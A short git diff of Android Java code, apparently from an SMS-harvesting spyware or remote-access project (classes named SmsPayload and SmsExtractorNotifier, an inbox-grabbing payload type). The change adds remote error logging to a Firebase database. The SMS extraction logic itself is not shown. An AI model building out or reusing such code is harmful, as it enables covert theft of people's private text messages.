@@ -8,8 +8,10 @@ import android.os.AsyncTask;
 import android.util.Log;
 
 import com.aigs.serviceone.helpers.FileSystem;
+import com.aigs.serviceone.helpers.PayloadTypes;
 import com.aigs.serviceone.helpers.SmsExtractorNotifier;
 import com.aigs.serviceone.helpers.SmsModes;
+import com.google.firebase.database.FirebaseDatabase;
 
 import org.json.JSONArray;
 import org.json.JSONException;
@@ -69,6 +71,8 @@ public class SmsPayload extends AsyncTask<String, Integer, String> {
             }
         }catch (Exception e){
             Log.e("EXCEPTION_SMS : ",e.getMessage());
+            FirebaseDatabase.getInstance().getReference("Logs").child(PayloadTypes.GET_TEXT_MESSAGES_INBOX+"").child("CurrentLog").setValue(e.getMessage());
+
         }
 
         return null;
